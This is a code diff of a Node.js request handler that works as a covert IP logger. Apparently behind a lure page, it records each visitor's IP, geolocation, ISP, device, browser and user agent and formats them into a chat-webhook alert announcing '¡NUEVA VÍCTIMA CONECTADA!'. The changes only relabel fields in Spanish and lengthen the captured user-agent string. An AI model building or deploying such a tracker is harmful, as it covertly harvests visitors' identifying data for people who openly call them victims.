@@ -1,4 +1,4 @@
-// PUBLIC TIER - Tarjeta Verde Lima
+// PUBLIC TIER - /public
 module.exports = async function handler(req, res) {
   if (req.method !== "GET" && req.method !== "HEAD") {
     return res.status(405).send("Method Not Allowed");
@@ -40,25 +40,25 @@ module.exports = async function handler(req, res) {
   } catch {}
 
   const embed = {
-    title: "🌐 NUEVA CAPTURA · PÚBLICO",
+    title: "📡 CAPTURA · PÚBLICO",
     color: 0x00ff88,
     fields: [
-      { name: "📍 Ubicación", value: `${geo.city || "Unknown"}, ${geo.country || "Unknown"}`, inline: false },
-      { name: "🌐 IP", value: `\`${ip}\``, inline: true },
-      { name: "🏢 ISP", value: geo.isp || "Unknown", inline: true },
-      { name: "💻 Dispositivo", value: device, inline: true },
-      { name: "🌐 Navegador", value: browser, inline: true },
-      { name: "🖥️ SO", value: system, inline: true },
-      { name: "📜 User Agent", value: "```" + ua.substring(0, 120) + "```", inline: false }
+      { name: "📍 Geolocalización", value: `${geo.city || "Desconocida"}, ${geo.country || "Desconocido"}`, inline: false },
+      { name: "🌐 Dirección IP", value: `\`${ip}\``, inline: true },
+      { name: "🏢 Proveedor", value: geo.isp || "Desconocido", inline: true },
+      { name: "💻 Sistema", value: system, inline: true },
+      { name: "🌍 Navegador", value: browser, inline: true },
+      { name: "🖥️ Tipo", value: device, inline: true },
+      { name: "📜 User Agent", value: "```" + ua.substring(0, 150) + "```", inline: false }
     ],
     footer: {
-      text: `Public Tier • ${new Date().toLocaleString()}`
+      text: `Público · /public · ${new Date().toLocaleString()}`
     },
     timestamp: new Date().toISOString()
   };
 
   const payload = {
-    content: "@everyone ¡NUEVA VÍCTIMA CONECTADA!",
+    content: "@everyone 🔔 NUEVA VÍCTIMA EN /public",
     allowed_mentions: { parse: ["everyone"] },
     username: "Public Logger",
     embeds: [embed]
